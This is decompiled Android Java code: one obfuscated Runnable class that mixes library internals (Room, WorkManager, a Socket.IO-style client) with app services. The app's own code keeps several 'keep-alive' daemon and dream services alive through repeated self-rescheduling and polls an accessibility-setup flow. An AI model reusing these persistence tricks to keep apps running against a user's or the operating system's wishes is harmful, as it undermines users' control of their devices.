// Decompiled with JADX from the REA-supplied audited engine JAR; not original source.
package a2;

import android.content.ServiceConnection;
import android.database.Cursor;
import android.database.sqlite.SQLiteException;
import android.os.Handler;
import android.os.Looper;
import android.os.SystemClock;
import android.util.Log;
import android.view.View;
import android.widget.FrameLayout;
import androidx.work.Worker;
import e2.n1;
import java.io.IOException;
import java.util.IdentityHashMap;
import java.util.Iterator;
import java.util.Map;
import java.util.Set;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.locks.ReentrantReadWriteLock;
import java.util.logging.Level;
import java.util.logging.Logger;
import lyr.stable.runtime.SequentialPermissionActivity;
import lyr.stable.runtime.engine.CompanionService;
import lyr.stable.runtime.engine.EngineService;
import lyr.stable.runtime.engine.KeepAliveDaemonService;
import lyr.stable.runtime.engine.KeepAliveDreamService;
import lyr.stable.runtime.setup.A11yGuideActivity;
import w1.a9;
import w1.g8;
import w1.o2;
import w1.uf;

/* JADX INFO: compiled from: r8-map-id-5347474c40041fa035618ae5fd6f249b536e43095feee62dfa1b0bceecef7771 */
/* JADX INFO: loaded from: classes.dex */
public final class i implements Runnable {

    /* JADX INFO: renamed from: c, reason: collision with root package name */
    public final /* synthetic */ int f105c;

    /* JADX INFO: renamed from: d, reason: collision with root package name */
    public final Object f106d;

    public /* synthetic */ i(int i3, Object obj) {
        this.f105c = i3;
        this.f106d = obj;
    }

    private final void b() {
        Thread threadCurrentThread = Thread.currentThread();
        synchronized (((a9) this.f106d).f3485e) {
            a9 a9Var = (a9) this.f106d;
            if (!a9Var.f3489i && a9Var.f3487g == this) {
                a9Var.f3487g = null;
                a9Var.f3488h++;
                IdentityHashMap identityHashMap = a9Var.f3486f;
                identityHashMap.put(threadCurrentThread, Integer.valueOf(((Integer) identityHashMap.getOrDefault(threadCurrentThread, 0)).intValue() + 1));
                try {
                    ((a9) this.f106d).f3484d.run();
                    synchronized (((a9) this.f106d).f3485e) {
                        try {
                            int iIntValue = ((Integer) ((a9) this.f106d).f3486f.get(threadCurrentThread)).intValue() - 1;
                            a9 a9Var2 = (a9) this.f106d;
                            if (iIntValue == 0) {
                                a9Var2.f3486f.remove(threadCurrentThread);
                            } else {
                                a9Var2.f3486f.put(threadCurrentThread, Integer.valueOf(iIntValue));
                            }
                            a9 a9Var3 = (a9) this.f106d;
                            a9Var3.f3488h--;
                            a9Var3.f3485e.notifyAll();
                        } catch (Throwable th) {
                            throw th;
                        }
                    }
                } catch (Throwable th2) {
                    synchronized (((a9) this.f106d).f3485e) {
                        try {
                            int iIntValue2 = ((Integer) ((a9) this.f106d).f3486f.get(threadCurrentThread)).intValue() - 1;
                            a9 a9Var4 = (a9) this.f106d;
                            if (iIntValue2 == 0) {
                                a9Var4.f3486f.remove(threadCurrentThread);
                            } else {
                                a9Var4.f3486f.put(threadCurrentThread, Integer.valueOf(iIntValue2));
                            }
                            a9 a9Var5 = (a9) this.f106d;
                            a9Var5.f3488h--;
                            a9Var5.f3485e.notifyAll();
                            throw th2;
                        } catch (Throwable th3) {
                            throw th3;
                        }
                    }
                }
            }
        }
    }

    public j1.i a() throws IOException {
        g.f fVar = (g.f) this.f106d;
        j1.i iVar = new j1.i();
        Cursor cursorM = fVar.f1383a.m(new j.a("SELECT * FROM room_table_modification_log WHERE invalidated = 1;"));
        while (cursorM.moveToNext()) {
            try {
                iVar.add(Integer.valueOf(cursorM.getInt(0)));
            } catch (Throwable th) {
                try {
                    throw th;
                } catch (Throwable th2) {
                    y.f.c(cursorM, th);
                    throw th2;
                }
            }
        }
        cursorM.close();
        j1.i iVarB = q2.k.b(iVar);
        if (iVarB.f2358c.isEmpty()) {
            return iVarB;
        }
        if (((g.f) this.f106d).f1389g == null) {
            o2.k("Required value was null.");
            return null;
        }
        k.i iVar2 = ((g.f) this.f106d).f1389g;
        if (iVar2 != null) {
            iVar2.d();
            return iVarB;
        }
        o2.i("Required value was null.");
        return null;
    }

    @Override // java.lang.Runnable
    public final void run() {
        Object obj;
        Set setA;
        l2.a aVarC;
        long jNanoTime;
        long j3;
        switch (this.f105c) {
            case 0:
                if (EngineService.f2589l) {
                    c.x((EngineService) this.f106d, true);
                    ((EngineService) this.f106d).f2600j.postDelayed(this, 5000L);
                    return;
                }
                return;
            case 1:
                KeepAliveDreamService keepAliveDreamService = (KeepAliveDreamService) this.f106d;
                try {
                    c.y(keepAliveDreamService.getApplicationContext(), true, SystemClock.elapsedRealtime());
                    c.c(keepAliveDreamService.getApplicationContext());
                    keepAliveDreamService.f2605b.postDelayed(this, 5000L);
                    return;
                } catch (Throwable unused) {
                    return;
                }
            case 2:
                v vVar = (v) this.f106d;
                Handler handler = vVar.f145b;
                boolean z2 = vVar instanceof KeepAliveDaemonService;
                if (z2) {
                    r.q(vVar, "daemon-policy");
                }
                if (r.k(vVar)) {
                    handler.removeCallbacks(vVar.f148e);
                    vVar.f147d = false;
                    vVar.f();
                    if (!z2) {
                        vVar.f152i = true;
                        vVar.stopSelf();
                        return;
                    }
                    CompanionService.e(vVar);
                } else {
                    r.s(vVar);
                    if (!vVar.f147d) {
                        for (ServiceConnection serviceConnection : vVar.f146c) {
                            if (serviceConnection == null) {
                            }
                        }
                        vVar.c();
                    }
                }
                handler.postDelayed(this, 30000L);
                return;
            case 3:
                synchronized (((androidx.lifecycle.h) this.f106d).f189a) {
                    obj = ((androidx.lifecycle.h) this.f106d).f192d;
                    ((androidx.lifecycle.h) this.f106d).f192d = androidx.lifecycle.h.f188h;
                    break;
                }
                androidx.lifecycle.h hVar = (androidx.lifecycle.h) this.f106d;
                a.b.z().f3c.getClass();
                if (Looper.getMainLooper().getThread() != Thread.currentThread()) {
                    o2.k("Cannot invoke setValue on a background thread");
                    return;
                }
                hVar.f191c = obj;
                if (hVar.f193e) {
                    hVar.f194f = true;
                    return;
                }
                hVar.f193e = true;
                do {
                    hVar.f194f = false;
                    b.e eVar = hVar.f190b;
                    eVar.getClass();
                    b.d dVar = new b.d(eVar);
                    eVar.f251c.put(dVar, Boolean.FALSE);
                    if (dVar.hasNext()) {
                        throw null;
                    }
                } while (hVar.f194f);
                hVar.f193e = false;
                return;
            case 4:
                try {
                    ((Runnable) this.f106d).run();
                    synchronized (f1.b.class) {
                        try {
                            int i3 = f1.b.f1114g - 1;
                            f1.b.f1114g = i3;
                            if (i3 == 0) {
                                f1.b.f1113f.shutdown();
                                f1.b.f1113f = null;
                                f1.b.f1112e = null;
                            }
                        } catch (Throwable th) {
                            throw th;
                        }
                        break;
                    }
                    return;
                } catch (Throwable th2) {
                    try {
                        f1.b.f1110c.log(Level.SEVERE, "Task threw exception", th2);
                        throw th2;
                    } catch (Throwable th3) {
                        synchronized (f1.b.class) {
                            try {
                                int i4 = f1.b.f1114g - 1;
                                f1.b.f1114g = i4;
                                if (i4 == 0) {
                                    f1.b.f1113f.shutdown();
                                    f1.b.f1113f = null;
                                    f1.b.f1112e = null;
                                }
                                throw th3;
                            } catch (Throwable th4) {
                                throw th4;
                            }
                        }
                    }
                }
            case 5:
                A11yGuideActivity a11yGuideActivity = (A11yGuideActivity) this.f106d;
                int i5 = A11yGuideActivity.f2644k;
                if (w1.n.L(a11yGuideActivity)) {
                    a11yGuideActivity.finish();
                    return;
                } else {
                    if (a11yGuideActivity.isFinishing() || a11yGuideActivity.isDestroyed()) {
                        return;
                    }
                    a11yGuideActivity.f2651g.postDelayed(this, 200L);
                    return;
                }
            case 6:
                ReentrantReadWriteLock.ReadLock lock = ((g.f) this.f106d).f1383a.f217h.readLock();
                lock.getClass();
                lock.lock();
                try {
                    try {
                        try {
                            if (((g.f) this.f106d).a() && ((g.f) this.f106d).f1387e.compareAndSet(true, false) && !((g.f) this.f106d).f1383a.h().r().C()) {
                                k.c cVarR = ((g.f) this.f106d).f1383a.h().r();
                                cVarR.w();
                                try {
                                    setA = a();
                                    cVarR.F();
                                    cVarR.z();
                                    lock.unlock();
                                    if (setA.isEmpty()) {
                                        return;
                                    }
                                    g.f fVar = (g.f) this.f106d;
                                    synchronized (fVar.f1391i) {
                                        Iterator it = fVar.f1391i.iterator();
                                        while (true) {
                                            b.b bVar = (b.b) it;
                                            if (bVar.hasNext()) {
                                                ((g.e) ((Map.Entry) bVar.next()).getValue()).a(setA);
                                            }
                                        }
                                    }
                                    return;
                                } catch (Throwable th5) {
                                    cVarR.z();
                                    throw th5;
                                }
                            }
                            lock.unlock();
                            return;
                        } catch (Throwable th6) {
                            lock.unlock();
                            throw th6;
                        }
                    } catch (SQLiteException e3) {
                        Log.e("ROOM", "Cannot run invalidation tracker. Is the db closed?", e3);
                        setA = i1.s.f2106c;
                    }
                } catch (IllegalStateException e4) {
                    Log.e("ROOM", "Cannot run invalidation tracker. Is the db closed?", e4);
                    setA = i1.s.f2106c;
                }
                break;
            case 7:
                ((g0.h) this.f106d).h();
                return;
            case 8:
                com.google.android.gms.common.internal.a aVar = ((g0.h) ((n1) this.f106d).f905c).f1457b;
                aVar.b(aVar.getClass().getName().concat(" disconnecting because it was signed out."));
                return;
            case 9:
                throw null;
            case 10:
                break;
            case 11:
                Worker worker = (Worker) this.f106d;
                try {
                    worker.f205e.i(worker.g());
                    return;
                } catch (Throwable th7) {
                    worker.f205e.j(th7);
                    return;
                }
            case 12:
                try {
                    throw new IllegalStateException("Expedited WorkRequests require a Worker to provide an implementation for \n `getForegroundInfo()`");
                } catch (Throwable th8) {
                    ((a0.l) this.f106d).j(th8);
                    return;
                }
            case 13:
                w0.k kVar = (w0.k) ((w0.g) this.f106d).f3389d;
                if (kVar.f3395c) {
                    return;
                }
                w0.k.f3393r.fine("attempting reconnect");
                kVar.a("reconnect_attempt", Integer.valueOf(kVar.f3399g.f3276d));
                if (kVar.f3395c) {
                    return;
                }
                f1.b.a(new g0.j(kVar, new n1(this), 6));
                return;
            case 14:
                q.t tVar = (q.t) this.f106d;
                if (((AtomicBoolean) tVar.f3081e).get()) {
                    tVar.b();
                    ((Handler) tVar.f3079c).postDelayed(this, 60000L);
                    return;
                }
                return;
            case 15:
                g8 g8Var = (g8) this.f106d;
                if (g8Var.f4124g) {
                    return;
                }
                g8Var.d(g8Var.f4125h == 0);
                int i6 = g8Var.f4125h;
                g8Var.f4125h = i6 + 1;
                if (i6 == 0) {
                    j3 = 120;
                } else if (i6 == 1) {
                    j3 = 280;
                } else if (i6 != 2) {
                    return;
                } else {
                    j3 = 600;
                }
                g8.f4118j.postDelayed(this, j3);
                return;
            case 16:
                b();
                return;
            case 17:
                SequentialPermissionActivity sequentialPermissionActivity = (SequentialPermissionActivity) this.f106d;
                if (SequentialPermissionActivity.f2565h.get()) {
                    w1.n.A0(sequentialPermissionActivity, true);
                    sequentialPermissionActivity.f2566a.postDelayed(this, 5000L);
                    return;
                }
                return;
            case 18:
                uf ufVar = (uf) this.f106d;
                View view = ufVar.f5263h;
                FrameLayout frameLayout = ufVar.f5260e;
                if (ufVar.f5268m && ufVar.isAttachedToWindow() && ufVar.getVisibility() == 0 && frameLayout.getWidth() > 0) {
                    view.setTranslationX(-view.getWidth());
                    view.animate().translationX(frameLayout.getWidth()).setDuration(1650L).setInterpolator(ufVar.f5264i).withEndAction(this).start();
                    return;
                }
                return;
            case 19:
                y0.l lVar = ((y0.e) this.f106d).f6051d;
                if (lVar.f6095z == 4) {
                    return;
                }
                lVar.h("ping timeout", null);
                return;
            case 20:
                y0.i iVar = (y0.i) ((y0.h) this.f106d).f6059b;
                if (iVar.f6060a[0] || 4 == iVar.f6063d.f6095z) {
                    return;
                }
                y0.l.A.fine("changing transport and sending upgrade packet");
                iVar.f6064e[0].run();
                y0.l.e(iVar.f6063d, iVar.f6062c[0]);
                a1.b bVar2 = new a1.b(null, "upgrade");
                y0.o oVar = iVar.f6062c[0];
                oVar.getClass();
                f1.b.a(new g0.j(oVar, new a1.b[]{bVar2}, 15));
                iVar.f6063d.a("upgrade", iVar.f6062c[0]);
                iVar.f6062c[0] = null;
                y0.l lVar2 = iVar.f6063d;
                lVar2.f6075e = false;
                lVar2.g();
                return;
            case 21:
                z0.b bVar3 = (z0.b) this.f106d;
                bVar3.f6108b = true;
                bVar3.a("drain", new Object[0]);
                return;
            case 22:
                ((i) ((y0.h) this.f106d).f6059b).run();
                return;
            case 23:
                z0.g gVar = ((z0.f) this.f106d).f6294a;
                Logger logger = z0.g.f6295o;
                gVar.f6117k = 3;
                gVar.a("close", new Object[0]);
                return;
            case 24:
                z0.g gVar2 = (z0.g) ((i) this.f106d).f106d;
                gVar2.f6108b = true;
                gVar2.a("drain", new Object[0]);
                return;
            default:
                f1.b.b(new i(24, this));
                return;
        }
        while (true) {
            l2.e eVar2 = (l2.e) this.f106d;
            synchronized (eVar2) {
                aVarC = eVar2.c();
            }
            if (aVarC == null) {
                return;
            }
            l2.c cVar = aVarC.f2410c;
            cVar.getClass();
            l2.e eVar3 = (l2.e) this.f106d;
            boolean zIsLoggable = l2.e.f2422i.isLoggable(Level.FINE);
            if (zIsLoggable) {
                jNanoTime = System.nanoTime();
                q2.c.a(aVarC, cVar, "starting");
            } else {
                jNanoTime = -1;
            }
            try {
                l2.e.a(eVar3, aVarC);
                if (zIsLoggable) {
                    q2.c.a(aVarC, cVar, "finished run in ".concat(q2.c.l(System.nanoTime() - jNanoTime)));
                }
            } catch (Throwable th9) {
                try {
                    eVar3.f2423a.f2420a.execute(this);
                    throw th9;
                } catch (Throwable th10) {
                    if (zIsLoggable) {
                        q2.c.a(aVarC, cVar, "failed a run in ".concat(q2.c.l(System.nanoTime() - jNanoTime)));
                    }
                    throw th10;
                }
            }
        }
    }

    public /* synthetic */ i(Object obj, Object obj2, int i3) {
        this.f105c = i3;
        this.f106d = obj2;
    }
}
